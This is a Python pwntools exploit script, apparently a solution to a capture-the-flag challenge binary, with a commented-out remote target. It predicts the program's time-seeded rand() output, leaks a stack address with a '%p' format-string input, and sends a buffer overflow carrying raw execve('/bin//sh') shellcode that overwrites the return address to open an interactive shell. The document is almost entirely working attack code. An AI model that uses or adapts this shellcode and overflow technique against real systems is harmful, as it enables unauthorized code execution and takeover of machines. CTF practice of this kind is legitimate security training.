from pwn import *
import ctypes
import time

# Load the C standard library
libc = ctypes.CDLL("libc.so.6")

# Get current Unix time (equivalent to time(0) in C)
seed = int(time.time())

# Seed the rand() function
libc.srand(seed)
# print(f"firs time: {libc.rand()}")

# sleep(2)
# print(f"secon time: {libc.rand()}")

# Simulate rand() and mimic rand() % 0x5b + 10 like in your C code
number = (libc.rand())% 0x5b + 10
print(f"[{seed}] Simulated rand(): {number}")
context.terminal = ["tmux", "new-window"]
# Set the path to your C binary
# binary_path = "./a.out"  # or "./a.out" or whatever you compiled

# # Spawn the process
# context.log_level = 'debug'
# p = process(binary_path)


# output = p.recvline()
# num = int(output,16)
# number = (num+3) % 0x5b + 10
# print(f"number {number}")


# p = remote('34.45.81.67', 16004)
p = process('./chall')
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
p.recv()
# gdb.attach(p,gdbscript="""b highscore""")

p.sendline(b'bunda')
p.sendlineafter(b'honks?',str(number))
p.sendlineafter(b'again?',b'%p')
p.recv(4)
leak = p.recv(14)

print(f"Leak line: {leak}")
addr = int(leak,16)
payload = b"a" * 0x126 + shellcode + b"z" * 0x3b + p64(addr)
p.sendlineafter(b'world?',payload)

p.interactive()